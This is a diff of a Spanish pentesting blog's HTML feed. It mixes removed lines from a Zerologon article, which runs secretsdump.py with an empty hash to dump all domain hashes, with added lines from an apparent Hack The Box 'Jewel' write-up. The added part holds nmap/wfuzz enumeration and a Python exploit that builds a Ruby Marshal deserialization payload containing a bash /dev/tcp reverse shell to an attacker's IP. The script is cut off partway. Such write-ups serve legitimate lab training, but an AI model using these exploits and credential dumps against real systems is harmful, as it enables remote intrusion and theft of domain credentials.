-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;secretsdump.py &lt;span class=&quot;nt&quot;&gt;-hashes&lt;/span&gt; :31d6cfe0d16ae931b73c59d7e0c089c0 &lt;span class=&quot;s1&quot;&gt;'DOMAIN/DC_NETBIOS_NAME$@dc_ip_addr'&lt;/span&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; categories /usr/share/nmap/scripts/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.nse | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oP&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&quot;.*?&quot;'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;sort&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Para mi caso quedaría de la siguiente forma:&lt;/p&gt;
+&lt;p&gt;Estas categorías son todas las que nmap posee, pudiendo por ejemplo para un servicio FTP o SMB aplicar las siguientes categorías:&lt;/p&gt;
 
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;secretsdump.py &lt;span class=&quot;nt&quot;&gt;-hashes&lt;/span&gt; :31d6cfe0d16ae931b73c59d7e0c089c0 &lt;span class=&quot;s1&quot;&gt;'s4vicorp/DC-Company$@192.168.101.130'&lt;/span&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p21&lt;/span&gt;,445 &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;vuln and safe&quot;&lt;/span&gt; 10.10.10.211 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; vulnSafeScan
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Obteniendo los siguientes resultados tras su ejecución:&lt;/p&gt;
-
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; 10.10.10.211 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; allPorts
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/zerologon/4.png&quot; /&gt;
+&lt;img src=&quot;/assets/images/jewel/nmap2.png&quot; /&gt;
 &lt;/p&gt;
 
-&lt;p&gt;Conseguimos listar los hashes de todos los usuarios existentes a nivel de dominio, incluido aquellos que sean administradores del dominio. Básicamente el mismo efecto que obtendríamos si desde CrackMapExec hubiéramos hecho uso de la acción &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--ntds vss&lt;/code&gt;, pero claro… en ese caso habríamos necesitado credenciales válidas, lo bueno del Zerologon es que no hace falta nada de eso :)&lt;/p&gt;</content><author><name>Jflabur</name><email>s4vipriv@gmail.com</email></author><category term="Research" /><category term="Utilidades" /><category term="Exploits" /><category term="Vulnerabilidades" /><category term="Pentesting" /><category term="Herramientas" /><category term="Windows" /><category term="Linux" /><category term="Domain Controller" /><category term="Guías" /><category term="Privilege Escalation" /><summary type="html">Mucho se está hablando acerca de la nueva vulnerabilidad Zerologon, pero... ¿realmente es crítica?. Lo analizaremos en detalle en este artículo.</summary></entry><entry><title type="html">Cómo construir tu propio sistema Linux</title><link href="http://localhost:4000/como-crear-un-sistema-linux/" rel="alternate" type="text/html" title="Cómo construir tu propio sistema Linux" /><published>2020-04-23T00:00:00+02:00</published><updated>2020-04-23T00:00:00+02:00</updated><id>http://localhost:4000/como-crear-un-sistema-linux</id><content type="html" xml:base="http://localhost:4000/como-crear-un-sistema-linux/">&lt;h1 id=&quot;cómo-construir-tu-propio-sistema-linux-s4vios&quot;&gt;Cómo construir tu propio sistema Linux (S4viOS)&lt;/h1&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;extractPorts allPorts
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;which extratPorts
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p8080&lt;/span&gt; 10.10.10.211 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; targeted
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;whatweb http://10.10.10.211:8080 2&amp;gt;/dev/null
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt; http-enum &lt;span class=&quot;nt&quot;&gt;-p8080&lt;/span&gt; 10.10.10.211 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; webScan
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wfuzz &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--hc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;404 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.211:8080/FUZZ
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;conseguir-el-web-server&quot;&gt;Conseguir el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;web server&lt;/code&gt;&lt;/h2&gt;
+&lt;p&gt;Script en python para conseguir &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Shell&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;re&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;URL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'http://{}:8080'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'myuser4'&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'mypass4'&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;email&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'myuser4@mail.com'&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;specify target IP, your IP and port: python3 rev.py 10.10.xx.xx 9001&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;resp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;URL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'/signup'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;rx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;r'token&quot; content=&quot;(.*)&quot;'&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;token&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;re&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;resp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# create user
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'utf8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'â'&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'authenticity_token'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'user[username]'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'user[email]'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;email&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'user[password]'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'commit'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Create User'&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;resp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;URL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'/users'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# login
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'utf8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'â'&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'authenticity_token'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'session[email]'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;email&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'session[password]'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'commit'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Log in'&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;resp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;URL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'/login'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;rx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;r'href=&quot;/users/(.*)&quot;'&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;user_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;re&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;resp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# rev shell
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rev&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;bash -c 'bash -i &amp;gt;&amp;amp; /dev/tcp/{}/{} 0&amp;gt;&amp;amp;1'&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x04\x08&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;o&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x3A\x40&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;ActiveSupport&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x3A\x3A&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Deprecation&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x3A\x3A&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;DeprecatedInstanceVariableProxy'&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x09\x3A\x0E\x40&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;instanceo&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x3A\x08&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;ERB&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x08\x3A\x09\x40&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;srcI&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x22&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'{}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x60&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;{}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x60&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rev&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rev&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x06\x3A\x06&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;ET&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x3A\x0E\x40&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;filenameI&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x22\x06&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x06\x3B\x09&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;T&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x3A\x0C\x40&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;linenoi&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x06\x3A\x0C\x40&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x3A&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x0B&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x3A\x09\x40&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;varI&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x22\x0C\x40&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x06\x3B\x09&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;T&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x3A\x10\x40&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;deprecatorIu&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x3A\x1F&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'ActiveSupport&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x3A\x3A&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Deprecation&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00\x06\x3B\x09&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;T'&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'utf8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'â'&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'authenticity_token'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'_method'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'patch'&lt;/span&gt;
